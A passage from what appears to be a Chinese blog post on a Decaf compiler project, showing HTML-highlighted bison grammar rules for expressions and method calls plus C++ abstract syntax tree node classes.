= <span class="keyword">new</span> decafAllexp(<span class="string">&quot;True&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_FALSE &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;False&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | method_call &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | T_NOT <span class="built_in">exp</span> &#123; decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;Not&quot;</span>, (decafAllexp*)$<span class="number">2</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_MINUS <span class="built_in">exp</span> %prec T_UMINUS &#123; decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;UnaryMinus&quot;</span>, (decafAllexp*)$<span class="number">2</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_PLUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Plus&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MINUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MULT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mult&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_DIV <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Div&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MOD <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mod&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEFTSHIFT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leftshift&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_RIGHTSHIFT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Rightshift&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Geq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Lt&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Gt&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_EQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Eq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_NEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Neq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_AND <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;And&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_OR <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Or&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_call: T_ID T_LPAREN para_list_use T_RPAREN &#123;</span><br><span class="line">        decafFunCall *call = <span class="keyword">new</span> decafFunCall();</span><br><span class="line">        decafStmtList* para = (decafStmtList*)$<span class="number">3</span>;</span><br><span class="line">        call-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        call-&gt;put_para(para-&gt;get_para());</span><br><span class="line">        $$ = call;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">  <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">  <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中用到的类与函数如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> YYTOKENTYPE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafast.tab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// decafAST - Base class for all abstract syntax tree nodes.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~<span class="built_in">decafAST</span>() &#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getString</span><span class="params">(decafAST *d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> d-&gt;<span class="built_in">str</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function">string <span class="title">commaList</span><span class="params">(list&lt;T&gt; vec)</span> </span>&#123;</span><br><span class="line">    <span class="function">string <span class="title">s</span><span class="params">(<span class="string">&quot;&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">typename</span> list&lt;T&gt;::iterator i = vec.<span class="built_in">begin</span>(); i != vec.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">        s = s + (s.<span class="built_in">empty</span>() ? <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>) : <span class="built_in">string</span>(<span class="string">&quot;,&quot;</span>)) + (*i)-&gt;<span class="built_in">str</span>(); </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        s = <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAllexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Kind;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="built_in">decafAllexp</span>(string name,string kind) : <span class="built_in">Name</span>(name),<span class="built_in">Kind</span>(kind)&#123;</span><br><span class="line">		map&lt;string,<span class="keyword">int</span>&gt; tab = &#123;</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\t&#x27;&quot;</span>,<span class="string">&#x27;\t&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\r&#x27;&quot;</span>,<span class="string">&#x27;\r&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\n&#x27;&quot;</span>,<span class="string">&#x27;\n&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\a&#x27;&quot;</span>,<span class="string">&#x27;\a&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\v&#x27;&quot;</span>,<span class="string">&#x27;\v&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\b&#x27;&quot;</span>,<span class="string">&#x27;\b&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\f&#x27;&quot;</span>,<span class="string">&#x27;\f&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\\&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&#x27;&#x27;&quot;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&quot;&#x27;&quot;</span>,<span class="string">&#x27;\&quot;&#x27;</span>&#125;,</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">if</span>( kind == <span class="string">&quot;NumberExpr&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(tab.<span class="built_in">count</span>(<span class="keyword">this</span>-&gt;Name))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(tab[<span class="keyword">this</span>-&gt;Name]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">0</span>]<span class="number">-48</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">3</span> &amp;&amp; ( <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&#x27;&#x27;</span> || <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&quot;&#x27;</span> ))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Kind + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafArrexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafArrexp</span>(string Name, decafAllexp *Exp) </span><br><span class="line">		: <span class="built_in">Name</span>(Name), <span class="built_in">Exp</span>(Exp) &#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ArrayLocExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBinexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Option;</span><br><span class="line">	decafAllexp * Exp1;</span><br><span class="line">	decafAllexp * Exp2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafBinexp</span>(string op, decafAllexp *exp1, decafAllexp *exp2) </span><br><span class="line">		: <span class="built_in">Option</span>(op), <span class="built_in">Exp1</span>(exp1), <span class="built_in">Exp2</span>(exp2) &#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;BinaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp2) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafUnaryexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Option;</span><br><span class="line">	decafAllexp * Exp1;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafUnaryexp</span>(string op, decafAllexp *exp1) </span><br><span class="line">		: <span class="built_in">Option</span>(op), <span class="built_in">Exp1</span>(exp1) &#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;UnaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafType</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="built_in">decafType</span>(string Type)&#123;<span class="keyword">this</span>-&gt;Type = Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVar</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line">	string Kind;</span><br><span class="line">	decafAllexp* Exp;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafVar</span>(string Name) &#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_arr</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Arr;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(string Type)</span></span>&#123;<span class="keyword">this</span>-&gt;Type = Type;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kind</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">			<span class="keyword">this</span>-&gt;Kind = Kind;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_exp</span><span class="params">(decafAllexp* Exp)</span></span>&#123;<span class="keyword">this</span>-&gt;Exp = Exp;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Exp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;AssignGlobalVar(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp)+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Kind != <span class="string">&quot;&quot;</span> &amp;&amp; Name != <span 